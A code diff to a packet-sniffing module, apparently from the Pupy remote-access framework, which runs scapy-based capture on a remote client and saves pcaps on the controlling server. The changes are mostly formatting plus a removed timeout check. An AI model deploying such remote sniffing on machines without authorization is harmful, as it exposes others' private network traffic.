@@ -8,8 +8,11 @@ import Queue
 import time
 import readline
 import logging
+
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
 from scapy.all import *
+
 import datetime
 from threading import Event
 
@@ -21,7 +24,11 @@ __class_name__="TcpdumpModule"
 class TcpdumpModule(PupyModule):
     """ module to reproduce some of the classic tcpdump tool functions """
 
-    dependencies = ('scapy', 'tcpdump')
+    dependencies = (
+        'scapy',
+        'tcpdump'
+    )
+
     terminate = None
     wait = Event()
 
@@ -59,21 +66,18 @@ class TcpdumpModule(PupyModule):
     def run(self, args):
         self.sniff_sess = None
 
+        filepath = None
+
         if self.client.is_windows():
             from modules.lib.windows.winpcap import init_winpcap
             init_winpcap(self.client)
 
         pktwriter = None
 
-        if args.timeout==None and args.count==0:
-            #TODO patch scapy to have an interruptible sniff() function
-            raise PupyModuleError("--timeout or --count options are mandatory for now.")
-
         if args.save_pcap:
             config = self.client.pupsrv.config or PupyConfig()
             filepath = config.get_file('pcaps', {'%c': self.client.short_name()})
             pktwriter = PcapWriter(filepath, append=True, sync=True)
-            self.info('Save pcap to: {}'.format(filepath))
 
         tcpdump = self.client.remote('tcpdump', 'run', False)
 
@@ -91,6 +95,9 @@ class TcpdumpModule(PupyModule):
         self.success(u'Scapy tcpdump on "{}" - started'.format(name))
         self.wait.wait()
         self.success(u'Scapy tcpdump on "{}" - completed'.format(name))
+
+        if filepath:
+            self.info('Pcap stored to: {}'.format(filepath))
 
     def interrupt(self):
         if self.terminate:
